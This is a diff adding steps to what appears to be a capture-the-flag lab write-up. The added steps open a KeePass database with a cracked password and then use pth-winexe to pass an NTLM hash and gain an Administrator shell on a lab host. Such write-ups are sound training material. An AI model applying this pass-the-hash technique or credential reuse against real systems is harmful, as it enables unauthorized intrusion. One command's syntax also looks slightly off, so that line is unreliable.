@@ -141,6 +141,29 @@ Session completed.
 
 So the password is moonshine1
 
+So first, you need to download keepassxc :
+
+```BASH
+sudo apt install keepassxc
+```
+
+And after you can run this and enter the password :
+
+```BASH
+keepassxc open file.kdbx
+```
+
+![[Pasted image 20250423173252.png]]
+
+![[Pasted image 20250423173816.png]]
+
+Now we can correctly connect to the machin as Administrator with : 
+
+```BASH
+pth-winexe -U jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb
+e81fe00 //10.129.228.112 cmd
+```
+
 ## 5. **Installation
 
 ## 6. **Command and Control
